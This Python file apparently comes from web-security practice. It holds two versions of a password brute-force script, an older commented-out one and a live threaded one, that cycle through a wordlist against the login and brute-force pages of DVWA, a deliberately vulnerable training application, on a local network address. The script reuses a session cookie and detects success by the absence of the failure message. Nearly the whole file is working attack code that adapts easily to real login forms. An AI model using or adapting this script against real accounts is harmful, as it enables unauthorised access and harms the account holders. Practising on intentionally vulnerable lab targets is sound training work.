# import requests
# from termcolor import colored

# url = "http://192.168.0.196/dvwa/login.php"
# username = "admin"
# password_file = "passwords.txt"
# login_fail_string = "Login failed"
# cookie_value = ""

# def cracking(username, url):
#     for password in passwords:
#         password = password.strip()
#         print(colored(f"Tring: {password}", "red"))
#         data = {'username':username, 'password':password, 'Login':'submit'}
#         if cookie_value != '':
#             response = requests.get(url=url, params={'username':username, 'password':password, 'Login':'Login'}, cookies={'Cookie':cookie_value})
#         else:
#             response = requests.post(url=url, data=data)
#         if login_fail_string in response.content.decode():
#             pass
#         else:
#             print(colored(f"[+] Found: username: {username}, password {password}", 'green'))
#             exit()

# if __name__ == "__main__":
#     with open(password_file, "r") as passwords:
#         cracking(username, url)
#     print(f'[!!] Not valid password in {password_file}!!')
    

import requests
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

url = "http://192.168.0.196/dvwa/vulnerabilities/brute/"
username = "admin"
password_file = "passwords.txt"
login_fail_string = "Username and/or password incorrect."
cookie_value = "security=high; PHPSESSID=46541507cc67b07b72edb55b4e5a38cc"

def check_password(password):
    print(colored(f"Trying: {password}", "red"))
    data = {'username': username, 'password': password, 'Login': 'submit'}
    if cookie_value:
        response = requests.get(url=url, params=data, cookies={'Cookie': cookie_value})
    else:
        response = requests.post(url=url, data=data)
    if login_fail_string not in response.text:
        print(colored(f"[+] Found: username: {username}, password {password}", 'green'))
        exit()

if __name__ == "__main__":
    with open(password_file, "r") as file:
        passwords = [line.strip() for line in file]

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_password, passwords)

    print(f'[!!] No valid password found in {password_file}!!')
